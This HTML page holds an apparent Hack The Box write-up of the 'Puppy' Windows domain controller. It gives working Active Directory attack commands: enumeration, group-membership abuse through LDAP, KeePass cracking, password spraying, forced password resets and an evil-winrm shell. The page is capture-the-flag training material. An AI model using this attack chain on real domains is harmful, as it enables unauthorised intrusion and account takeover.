<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Puppy</title>
  <link rel="stylesheet" href="../../style.css" />
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code&display=swap" rel="stylesheet"/>

  <style>
    .markdown-container {
      max-width: 1000px;
      margin: 40px auto;
      padding: 0 20px;
    }

    .markdown-body h2 {
      color: #339CFF;
      margin-top: 40px;
    }

    .markdown-body pre {
      background: transparent;
      padding: 1em;
      border: 1px solid #333;
      border-radius: 5px;
      overflow-x: auto;
      margin: 1em 0;
      white-space: pre-wrap;       
      word-wrap: break-word;       
      overflow-wrap: break-word;
    }

    .markdown-body pre code {
      color: #a79f9f;
      font-family: 'Fira Code', monospace;
      font-size: 0.8rem;
      background: none;
    }

.indent-paragraph {
  text-indent: 5em; 
  text-align: justify;
  margin: 1em 0;
}
p code {
      background: none !important;
      color: #9effa1 !important;
      font-family: 'Fira Code', monospace;
      font-size: 1rem;
      padding: 0;
      border: none;
    }
  </style>
</head>
<body class="home">

  <div id="header-container"></div>

  <div class="machine-banner" style="text-align: center; margin-top: 20px;">
    <img
      src="https://labs.hackthebox.com/storage/avatars/6a127b39657062e42c1a8dfdcd23475d.png"
      alt="Puppy HTB Logo"
      style="width: 150px; height: auto; filter: drop-shadow(0 0 4px red);" />
  </div>

  <div style="text-align: center; margin-top: 20px;">
    <p><strong>Difficulty:</strong> Medium</p>
    <p><strong>OS:</strong> Windows</p>
    <p>
      <a href="https://www.hackthebox.com/machines/puppy" target="_blank" style="color: #339CFF; font-weight: bold; text-decoration: none;">
        üîó Link to HTB
      </a>
    </p>
  </div>

  <div class="markdown-container">
    <div id="markdown-content" class="markdown-body"></div>
  </div>

  <script src="../../script.js"></script>
  <script>
    renderHeader();
  </script>

  <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
  <script>
    const markdown = `

<p class="indent-paragraph">
As is common in real life pentests, you will start the Puppy box with credentials for the following account:
<span class="blue">levi.james</span>:<span class="red">KingofAkron2025!</span>
</p>

## üß© Enumeration and Initial Access

<p class="indent-paragraph">
The first step involved scanning the target host with <code>nmap -sS -Pn -T4 IP</code>, a reliable SYN scan method optimized for speed and stealth. The <code>-sS</code> flag initiates a half-open scan, minimizing footprint and avoiding unnecessary detection. With <code>-Pn</code>, we skip ICMP probes, treating the host as alive from the start ‚Äî perfect for hardened targets. The <code>-T4</code> flag ensures we don‚Äôt waste time waiting around.
</p>

<p class="indent-paragraph">
The scan revealed multiple open TCP ports tied to core Windows services: DNS <code>(53)</code>, Kerberos <code>(88)</code>, NetBIOS <code>(139)</code>, and SMB <code>(445)</code>, just to name a few. Additional services like LDAPS <code>(636)</code>, NFS <code>(2049)</code>, iSCSI <code>(3260)</code>, and Global Catalog ports <code>(3268/3269)</code> strongly suggested a domain environment... 
</p>

\`\`\`
‚ûú$ nmap -sS -Pn -T4 -p- <IP>

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 19:57 UTC
Nmap scan report for <IP>
Host is up (0.13s latency).
Not shown: 65512 filtered tcp ports (no-response)

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3260/tcp  open  iscsi
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49692/tcp open  unknown
49718/tcp open  unknown
61847/tcp open  unknown
\`\`\`


<p class="indent-paragraph">
All signs were screaming ‚Äúdomain controller.‚Äù So we tossed the creds into SMB to see what would bite. Using <code>crackmapexec</code>, we authenticated to the SMB service with the provided credentials. The response confirmed our theory, this machine is indeed a domain controller named <span class="blue">DC</span>, part of the <span class="blue">PUPPY.HTB</span> domain. 
</p>

\`\`\`
‚ûú$ crackmapexec smb <IP> -u levi.james -p 'KingofAkron2025!'
SMB         <IP>     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         <IP>     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
\`\`\`

<p class="indent-paragraph">
Since we now know the domain is <span class="blue">PUPPY.HTB</span> and the hostname of the controller is simply <code>DC</code>, it‚Äôs a safe bet that <code>dc.puppy.htb</code> will resolve internally. Adding this entry to our local resolver will allow us to refer to the domain controller by name instead of IP, which comes in handy when dealing with SMB, Kerberos, and other AD protocols. 
</p>
<span class="red">nano /etc/hosts</span>

\`\`\`
<IP>   dc.puppy.htb 
\`\`\`

## üìÇ Enumerating SMB Shares

<p class="indent-paragraph">
With the hostname now resolvable, it was time to probe for SMB shares using our credentials. A quick run of <code>crackmapexec smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares</code> confirmed the host as a Windows Server 2022 domain controller in the <code>PUPPY.HTB</code> realm. Alongside standard shares like <code>ADMIN$</code>, <code>C$</code>, and <code>IPC$</code>, one stood out: <code>DEV</code> ‚Äî a custom entry labeled as a development resource for ‚ÄúPUPPY-DEVS‚Äù. Interestingly, no permissions were listed for the DEV share, maybe an oversight, or maybe levi.james just isn‚Äôt in the right group. Yet.
</p>


\`\`\`
‚ûú$ crackmapexec smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares

SMB         dc.puppy.htb    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb    445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         dc.puppy.htb    445    DC               [+] Enumerated shares
SMB         dc.puppy.htb    445    DC               Share           Permissions     Remark
SMB         dc.puppy.htb    445    DC               -----           -----------     ------
SMB         dc.puppy.htb    445    DC               ADMIN$                          Remote Admin
SMB         dc.puppy.htb    445    DC               C$                              Default share
SMB         dc.puppy.htb    445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         dc.puppy.htb    445    DC               IPC$            READ            Remote IPC
SMB         dc.puppy.htb    445    DC               NETLOGON        READ            Logon server share 
SMB         dc.puppy.htb    445    DC               SYSVOL          READ            Logon server share
\`\`\`

<p class="indent-paragraph">
With no immediate luck poking around SMB shares, the next move was to enumerate domain users and for that, we turned to RID brute-forcing. <code>nxc</code> (NetExec), a modern and modular successor to CrackMapExec, proved ideal for the task. Using <code>nxc smb dc.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser"</code> with the <code>--rid-brute</code> flag, we forced the DC to leak some of its internal identifiers. RIDs (Relative Identifiers) are how Active Directory keeps track of users and groups behind the scenes. With the right filter, even a low-privileged user can map out a decent portion of the environment.
</p>



\`\`\`
‚ûú$ nxc smb dc.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\\\\\\\' '{print $2}' | awk '{print $1}'

Administrator
Guest
krbtgt
DC$
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
\`\`\`

<p class="indent-paragraph">
With users in hand, we shifted focus to group memberships. A quick <code>ldapdomaindump dc.puppy.htb -u 'PUPPY.HTH\\levi.james' -p 'KingofAkron2025!'</code> gave us a full snapshot of the domain ‚Äî users, groups, and relationships. Time to dig into who‚Äôs sitting where.
</p>

\`\`\`
‚ûú$ ldapdomaindump dc.puppy.htb -u 'PUPPY.HTB\\levi.james' -p 'KingofAkron2025!' 
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
\`\`\`

<p class="indent-paragraph">
After running <code>ldapdomaindump</code>, we inspected the generated <code>domain_users.html</code> report to get a better view of the domain landscape. Beyond the usual suspects like <code>Administrator</code>, <code>Guest</code>, and <code>krbtgt</code>, several user accounts stood out ‚Äî notably <code>jamie.williams</code>, <code>adam.silver</code>, and <code>ant.edwards</code>, all members of the <span class="blue">DEVELOPERS</span> group. Meanwhile, <code>levi.james</code>, our current session, is sitting comfortably in <span class="blue">HR</span>. Not quite the crew you'd expect to be pushing code ‚Äî but maybe that can change.
</p>
<div style="margin-top: 20px;">
  <img src="../../assets/htb/puppy/ldap-domain-users.png" alt="LDAP Dump Table" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

## üßæ BloodHound ACL Analysis

<p class="indent-paragraph">
After mapping out the domain users and their respective groups, the next logical step was to understand the relationships between them. BloodHound is a powerful tool for visualizing Active Directory trust paths and permission structures ‚Äî and we didn‚Äôt want to miss any low-hanging escalation routes. Using the same credentials, we launched <code>bloodhound-python</code> to dump the AD metadata.
</p>


\`\`\`
‚ûú$ bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -dc dc.puppy.htb -d PUPPY.HTB -c All -ns <IP>

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 28S
\`\`\`

<p class="indent-paragraph">
To gain visibility into how our current user fits into the Active Directory environment, we leveraged <code>BloodHound</code> with the previously dumped data. After importing all JSON files, we ran a simple query to map direct relationships: <code>MATCH (n)-[r]->(m) RETURN n, r, m</code>. This allowed us to graph the domain layout. From there, we right-clicked the <code>levi.james@PUPPY.HTB</code> node and selected <em>Shortest Paths to Here</em>, revealing a cleaner, contextual view of privileges, group memberships, and potential lateral opportunities.
</p>

<p class="indent-paragraph">
  <img src="../../assets/htb/puppy/graph_levi_puppy_htb.png" alt="BloodHound graph for levi.james" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

<p class="indent-paragraph">
As seen earlier in the user dump, <span class="blue">levi.james</span> is part of the <code>HR</code> group ‚Äî not <code>DEVELOPERS</code> ‚Äî which neatly explains why access to the <code>DEV</code> share didn‚Äôt go through. It‚Äôs not about broken permissions; Levi just wasn‚Äôt on the guest list. But instead of giving up, we turned to BloodHound to see if there was another way in. Using the query <code>MATCH (n:Group {name: 'DEVELOPERS@PUPPY.HTB'}) RETURN n</code>, we locked onto the target group and followed <em>‚ÄúShortest Paths to Here‚Äù</em>. The results were promising: our session, <code>levi.james@puppy.htb</code>, has a <span class="highlight-red">GenericWrite</span> edge on the <code>DEVELOPERS</code> group ‚Äî a delegated permission that allows modification of group attributes. In short, Levi‚Äôs not a dev yet, but he has just enough power to make himself one.
</p>


<img src="../../assets/htb/puppy/graph_dev_puppy_htb.png" class="full-width-img" alt="BloodHound GenericWrite to Developers group"/>

<p class="indent-paragraph">
With <span class="blue">levi.james</span> holding <span class="highlight-red">GenericWrite</span> over the <code>DEVELOPERS</code> group, the next move is to gather his full distinguished name (DN). This is necessary for any direct LDAP modification. To extract only the relevant value, we run <code>ldapsearch -x -H ldap://dc.puppy.htb -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=levi.james)" dn | grep "^dn:" | cut -d " " -f2-</code>, which returns a clean and usable DN: <code>CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</code>. This value will be used in the group membership update that follows.
</p>

\`\`\`
‚ûú$ ldapsearch -x -H ldap://dc.puppy.htb -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=levi.james)" dn | grep "^dn:"
                  
dn: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
\`\`\`

<p class="indent-paragraph">
With Levi‚Äôs distinguished name in hand, we prepare an LDIF (LDAP Data Interchange Format) file ‚Äî a simple, structured format used to define changes to directory entries. In this case, the file contains four essential lines: the first line, <code>dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB</code>, specifies the exact object we intend to modify (the DEVELOPERS group); the second line, <code>changetype: modify</code>, tells the LDAP server this is a modification operation; the third line, <code>add: member</code>, defines the attribute we are appending to; and the final line, <code>member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</code>, inserts Levi‚Äôs DN as a new group member. This small file effectively instructs the domain controller to enroll Levi into the DEVELOPERS group ‚Äî and with the proper permissions in place, it‚Äôs all done in a single silent move.
</p>

<span class="red">nano modify-developers-group.ldif</span>
\`\`\`
dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
\`\`\`

<p class="indent-paragraph">
With the LDIF file prepared and saved as <code>modify-developers-group.ldif</code>, we proceed to apply the modification using <code>ldapmodify</code>. This command authenticates as <span class="blue">levi.james</span> and instructs the domain controller to append his distinguished name to the <code>DEVELOPERS</code> group. By running <code>ldapmodify -x -H ldap://dc.puppy.htb -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify-developers-group.ldif</code>, the server processes the request and, assuming no blocking ACLs are present, confirms success with a brief message ‚Äî Levi is now officially part of the developers.
</p>

\`\`\`
‚ûú$ ldapmodify -x -H ldap://dc.puppy.htb -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify-developers-group.ldif

modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
\`\`\`

<p class="indent-paragraph">
With Levi‚Äôs distinguished name successfully injected into the <code>DEVELOPERS</code> group, all that remained was to verify whether the new privileges took effect. For that, we used <code>netexec</code> and issued <code>nxc smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares</code>. The output confirmed that Levi now has <code>READ</code> access to the <code>DEV</code> share, previously inaccessible. The silent LDAP modification had done its job ‚Äî Levi wasn‚Äôt just in the directory anymore; he was inside the developers' workspace.
</p>

## üîì Exploring the DEV Share

\`\`\`
‚ûú$ nxc smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares 

SMB         dc.puppy.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb     445    DC               [+] PUPPY.HTB\\levi.james:KingofAkron2025! 
SMB         dc.puppy.htb     445    DC               [*] Enumerated shares
SMB         dc.puppy.htb     445    DC               Share           Permissions     Remark
SMB         dc.puppy.htb     445    DC               -----           -----------     ------
SMB         dc.puppy.htb     445    DC               ADMIN$                          Remote Admin
SMB         dc.puppy.htb     445    DC               C$                              Default share
SMB         dc.puppy.htb     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         dc.puppy.htb     445    DC               IPC$            READ            Remote IPC
SMB         dc.puppy.htb     445    DC               NETLOGON        READ            Logon server share 
SMB         dc.puppy.htb     445    DC               SYSVOL          READ            Logon server share
\`\`\`

<p class="indent-paragraph">
Now that <span class="blue">levi.james</span> has been successfully added to the <code>DEVELOPERS</code> group, it‚Äôs time to validate our access. To do this, we connect directly to the <code>DEV</code> share using <code>smbclient</code>. This utility provides an interactive SMB session where we can list and retrieve files, assuming proper permissions. By running <code>smbclient //dc.puppy.htb/DEV -U=levi.james%'KingofAkron2025!' -W PUPPY.HTB</code>, we confirm read access to the share and discover several interesting files ‚Äî including a KeePass installer and a suspiciously named <code>recovery.kdbx</code> database.
</p>

\`\`\`
‚ûú$ smbclient //dc.puppy.htb/DEV -U=levi.james%'KingofAkron2025!' -W PUPPY.HTB

Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Wed May 28 00:05:29 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025

		5080575 blocks of size 4096. 1626432 blocks available
smb: \> get recovery.kdbx 
getting file \\recovery.kdbx of size 2677 as recovery.kdbx (4.6 KiloBytes/sec) (average 4.6 KiloBytes/sec)
\`\`\`

<p class="indent-paragraph">
Once the <code>recovery.kdbx</code> file was in hand, the next step was to attempt its decryption using <code>keepassxc-cli</code>. However, running <code>keepassxc-cli open recovery.kdbx</code> immediately prompted for a password. Several attempts resulted in failure ‚Äî the tool returned an <code>Invalid credentials</code> error, indicating that the database is protected by a master password that must now be recovered.
</p>

## üîê Cracking the KeePass Vault

\`\`\`
‚ûú$ keepassxc-cli open recovery.kdbx

Enter password to unlock recovery.kdbx: ********
Error while reading the database: Invalid credentials were provided, please try again.
If this reoccurs, then your database file may be corrupt. (HMAC mismatch)
\`\`\`

<p class="indent-paragraph">
Faced with a modern KeePass database unsupported by traditional tools like <code>keepass2john</code>, an alternative approach was necessary. The tool <code>keepass4brute</code>,a Python-based KeePass v4+ password brute-forcer, proved effective for this scenario. After cloning the repository via <code>git clone https://github.com/r3nt0n/keepass4brute</code>, we launched a dictionary attack using the classic <code>rockyou.txt</code> wordlist. The process was slow, but eventually, success came with the word <code>liverpool</code> ‚Äî the correct password to unlock the secrets stored within <code>recovery.kdbx</code>.
</p>

\`\`\`
‚ûú$ ./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 216 - Estimated time remaining: 6 weeks, 4 days
[+] Current attempt: liverpool

[*] Password found: liverpool
\`\`\`

<p class="indent-paragraph">
The CLI hit a wall, but the GUI picked up where it left off. With the recovered <code>liverpool</code> password, we launched <code>keepassxc recovery.kdbx</code> and finally gained visual access to the database. Inside, we found five familiar names tied to domain accounts, each entry hiding a potential credential behind masked fields. With a few clicks, the passwords were revealed: <code>HJKL2025!</code>, <code>Antman2025!</code>, <code>JamieLove2025!</code>, <code>ILY2025!</code>, and <code>Steve2025!</code>. 
</p>

<img src="../../assets/htb/puppy/keepass_recovery-kdbx.png" class="full-width-img" alt="recovery.kdbx"/>

<p class="indent-paragraph">
With a fresh batch of credentials in hand (usernames from our earlier RID brute-force enumeration and passwords extracted from the cracked KeePass database) it was time to test for valid logins. We passed both lists into <code>netexec</code> and issued <code>nxc smb dc.puppy.htb -u ../users-puppy-htb.txt -p ../pass-puppy-htb.txt</code>, letting it churn through possible combinations. The result? A clean hit: <span class="blue">PUPPY.HTB\ant.edwards:Antman2025!</span>. No domain admin logins, yet, but this set was definitely worth validating across the environment.
</p>

## üß™ Validating Credentials Across the Domain

\`\`\`
‚ûú$ nxc smb dc.puppy.htb -u users-puppy-htb.txt -p pass-puppy-htb.txt | grep "[+]"

SMB               dc.puppy.htb     445    DC               [+] PUPPY.HTB\\ant.edwards:Antman2025! 
\`\`\`

<p class="indent-paragraph">
With valid domain credentials for <code>ant.edwards</code> in hand, we reran BloodHound to see what kind of access this new account could reveal. Using the command <code>bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -dc dc.puppy.htb -d PUPPY.HTB -c All -ns 10.10.11.70 -o bloodhound_edwards.json</code>, we initiated a full collection cycle targeting the domain controller. The process completed successfully ‚Äî and just like that, the map of Active Directory got a lot more interesting.
</p>

## üïµÔ∏è‚Äç‚ôÇÔ∏è BloodHound Enumeration & AD Mapping

\`\`\`
‚ûú$ bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -dc dc.puppy.htb -d PUPPY.HTB -c All -ns <IP> -o bloodhound_edwards.json

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 29S
\`\`\`

<p class="indent-paragraph">
To explore the extent of <span class="blue">ant.edwards</span>'s influence within the domain, we ran a broader query to uncover any shortest privilege paths linking him to other user objects. Using <code>MATCH (n:User {name: 'ANT.EDWARDS@PUPPY.HTB'}), (m:User) WHERE n &lt;&gt; m WITH n, m MATCH p = shortestPath((n)-[*..4]-&gt;(m)) RETURN p</code>, we visualized the privilege graph around his account. The resulting BloodHound path revealed a particularly notable relationship: <span class="blue">ant.edwards</span> is a member of the <code>SENIOR DEVS</code> group, which holds <span class="highlight-red">GenericAll</span> permissions over <code>adam.silver</code>. This means Edwards can reset Adam‚Äôs password or make any modification to his account ‚Äî a promising vector for lateral movement.
</p>

<img src="/assets/htb/puppy/graph_objects_ant-edwards.png" alt="BloodHound showing SENIOR DEVS GenericAll over Adam Silver">

## üéØ Abusing GenericAll to Reset a Password

<p class="indent-paragraph">
While reviewing the permissions extracted via BloodHound, one edge stood out: <span class="highlight-red">GenericAll</span> granted to <span class="blue">ant.edwards</span> over <code>adam.silver</code>. This level of access permits full control over the target user object, including the ability to set a new password. Following the approach described in <a href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/" target="_blank" style="color: #89CFF0; text-decoration: none;"><strong>Abusing AD-DACL: ForceChangePassword</strong></a>, we connected to the domain controller using <code>rpcclient</code>, a powerful command-line tool for interacting with Windows services over SMB. By issuing <code>setuserinfo ADAM.SILVER 23 Ch4ng3Passw0rd@123</code>, we invoked the level <code>23</code> structure, which instructs the server to silently overwrite the user‚Äôs password without requiring the original. At first, login attempts failed with <code>STATUS_ACCOUNT_DISABLED</code>.
</p>


\`\`\`
‚ûú$ rpcclient -U 'dc.puppy.htb\\Ant.Edwards%Antman2025!' dc.puppy.htb

rpcclient $> setuserinfo ADAM.SILVER 23 Ch4ng3Passw0rd@123
rpcclient $> exit
\`\`\`

\`\`\`
nxc dc.puppy.htb smb  -u 'ADAM.SILVER' -p 'Ch4ng3Passw0rd@123'

SMB         dc.puppy.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb     445    DC               [-] PUPPY.HTB\\ADAM.SILVER:Ch4ng3Passw0rd@123 STATUS_ACCOUNT_DISABLED 
\`\`\`

## ‚úÖ Re-enabling the Disabled Account

<p class="indent-paragraph">
With Adam‚Äôs password reset, we were nearly there, except the account was still flagged as disabled. To address this, we used <code>bloodyAD</code>, a post-exploitation tool designed to manipulate Active Directory objects via LDAP operations. By issuing <code>remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE</code>, we cleared the <code>ACCOUNTDISABLE</code> bit from the <code>userAccountControl</code> attribute, effectively reactivating the account. No need to edit the object manually or interact via GUI ‚Äî a single command, and Adam Silver was back online.
</p>


\`\`\`
‚ûú$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from ADAM.SILVER's userAccountControl
\`\`\`

## ü™ü Gaining Shell Access with Evil-WinRM

<p class="indent-paragraph">
With the account re-enabled and armed with valid credentials, we initiated a session using <code>evil-winrm</code>, a reliable tool for remote PowerShell access in Windows environments. Connecting to the domain controller as <span class="blue">adam.silver</span>, we navigated to the user‚Äôs <code>Desktop</code> and retrieved the <code>user.txt</code> flag ‚Äî final confirmation that our foothold had been successfully established.
</p>

\`\`\`
‚ûú$ evil-winrm -i dc.puppy.htb -u adam.silver -p 'Ch4ng3Passw0rd@123'    
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents> 
*Evil-WinRM* PS C:\\Users\\adam.silver\\Documents> cd ../Desktop
*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop> dir

    Directory: C:\\Users\\adam.silver\\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---         5/28/2025   1:15 PM             34 user.txt

*Evil-WinRM* PS C:\\Users\\adam.silver\\Desktop> type user.txt
fde97**********************f873e4
\`\`\`

## ‚¨ÜÔ∏è Privilege Escalation



---

![HTB Puppy Badge](https://www.hackthebox.com/storage/machines/8f90c43bd1ae2c8b328c38e62a8d03d7.png)
    `;
    document.getElementById("markdown-content").innerHTML = marked.parse(markdown);
  </script>
</body>
</html>